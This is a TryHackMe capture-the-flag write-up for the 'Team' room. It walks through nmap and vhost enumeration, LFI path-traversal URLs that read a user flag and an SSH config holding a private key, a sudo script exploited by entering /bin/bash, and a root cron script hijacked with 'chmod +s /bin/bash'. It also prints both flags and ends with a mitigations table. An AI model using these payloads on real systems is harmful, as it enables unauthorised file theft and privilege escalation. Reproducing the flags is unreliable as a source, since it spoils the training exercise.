# CTF Write-Up: [Team](https://tryhackme.com/room/teamcw)

> **Platform:** TryHackMe | **Difficulty:** Easy

---

## 🚩 Flags

<details>
<summary>User Flag</summary>

`THM{6Y0TXHz7c2d}`

</details>

<details>
<summary>Root Flag</summary>

`THM{fhqbznavfonq}`

</details>

---

## 1. Reconnaissance

### Initial Nmap Scan

```
nmap <IP_ADDRESS> -vv -oN Nmap/Initial
```

```
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 62
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62
```

### Detailed Nmap Scan

```
nmap <IP_ADDRESS> -p 21,22,80 -A -vv -oN Nmap/Detailed
```

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 21 | FTP | vsftpd 3.0.5 | Anonymous login rejected |
| 22 | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 | Login target |
| 80 | HTTP | Apache httpd 2.4.41 (Ubuntu) | Default page with vhost hint |

> **Key finding:** The Apache default page title read *"If you see this add 'team.thm'..."* — a direct hint to add the vhost to `/etc/hosts`.

```bash
echo "<IP_ADDRESS> team.thm" >> /etc/hosts
```

### Wappalyzer Fingerprinting

| Category | Detail |
|----------|--------|
| Web Server | Apache HTTP Server 2.4.41 |
| Operating System | Ubuntu |

---

## 2. Web Enumeration

### Virtual Host Enumeration

```bash
gobuster vhost -u http://team.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

```
dev.team.thm  (Status: 200)
www.dev.team.thm  (Status: 200)
```

```bash
echo "<IP_ADDRESS> dev.team.thm" >> /etc/hosts
```

### dev.team.thm — Page Source

Visiting `http://dev.team.thm/` and inspecting the source revealed a hidden parameter:

```html
<a href=script.php?page=teamshare.php>
```

The `?page=` parameter loads files dynamically — a classic **LFI** indicator.

---

## 3. Exploitation — LFI via Path Traversal

### Vulnerability

The `script.php?page=` parameter passes user input directly to a PHP file inclusion function without sanitisation, allowing path traversal to read arbitrary files from the filesystem.

### Retrieve User Flag Directly

```
http://dev.team.thm/script.php?page=../../../home/dale/user.txt
```

> 🚩 `THM{6Y0TXHz7c2d}`

### Retrieve Dale's SSH Private Key

The SSH server config file contained Dale's private key embedded in comments:

```
http://dev.team.thm/script.php?page=../../../etc/ssh/sshd_config
```

---

## 4. Initial Access — SSH as Dale

```bash
ssh -i dale_rsa dale@<IP_ADDRESS>
```

```
dale@ip-<IP_ADDRESS>:~$ id
uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),27(sudo),...
```

---

## 5. Privilege Escalation

### Privesc 1 — dale → gyles (Command Injection via sudo)

```bash
sudo -l
```

```
User dale may run the following commands:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

Inspecting the script:

```bash
cat /home/gyles/admin_checks
```

```bash
#!/bin/bash
...
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null   # user input executed directly as a command
...
```

The `$error` variable is executed as a shell command with no sanitisation. Injecting `/bin/bash` at the second prompt drops a shell as `gyles`:

```bash
sudo -u gyles /home/gyles/admin_checks
# Enter name of person backing up the data: test
# Enter 'date' to timestamp the file: /bin/bash
```

```
gyles@ip-10-48-188-234:~$ id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)
```

### Privesc 2 — gyles → root (Writable Cron Script + SUID bash)

`gyles` is a member of the `admin` group. Checking what the group owns:

```bash
find / -group admin 2>/dev/null
```

```
/usr/local/bin/main_backup.sh
```

The script is executed by a root cron job and is writable by the `admin` group:

```bash
cat /usr/local/bin/main_backup.sh
#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/
```

Appending a SUID payload:

```bash
echo "chmod +s /bin/bash" >> /usr/local/bin/main_backup.sh
```

After the cron job executes:

```bash
ls -la /bin/bash
# -rwsr-sr-x 1 root root ...

/bin/bash -p
whoami
# root

cat /root/root.txt
```

> 🚩 `THM{fhqbznavfonq}`

---

## 6. Attack Chain

```
Nmap Scan
    └─► Port 80 — Apache default page hints at vhost: team.thm

Vhost Enumeration
    └─► dev.team.thm discovered

Page Source Analysis
    └─► script.php?page= parameter identified — LFI confirmed

LFI
    └─► ../../../home/dale/user.txt        — user flag retrieved
    └─► ../../../etc/ssh/sshd_config       — Dale's SSH private key in comments

SSH Login
    └─► ssh -i dale_rsa dale@<IP_ADDRESS>

Privesc 1 — dale → gyles
    └─► sudo -l: dale can run /home/gyles/admin_checks as gyles (NOPASSWD)
    └─► Script passes $error directly to shell — command injection
    └─► Input: /bin/bash → shell as gyles

Privesc 2 — gyles → root
    └─► gyles in admin group → owns /usr/local/bin/main_backup.sh
    └─► Script executed by root cron job
    └─► Appended: chmod +s /bin/bash → SUID set on next cron run
    └─► /bin/bash -p → root
```

---

## 7. Vulnerabilities & Mitigations

| # | Vulnerability | Impact | Mitigation |
|---|---|---|---|
| 1 | LFI via unsanitised `?page=` parameter | Read arbitrary files including SSH keys and flags | Whitelist allowed pages; never pass raw user input to file functions |
| 2 | SSH private key stored in plaintext inside sshd_config comments | Full user access via key extraction | Never store credentials or keys in config files |
| 3 | Script executes unsanitised user input as a shell command (`$error`) | Command injection — lateral movement to gyles | Quote all variables; validate input strictly |
| 4 | Root cron script writable by unprivileged group | Full root compromise via cron hijacking | Restrict write permissions on cron scripts to root only |

---

*Team — TryHackMe | Rooted ✅*
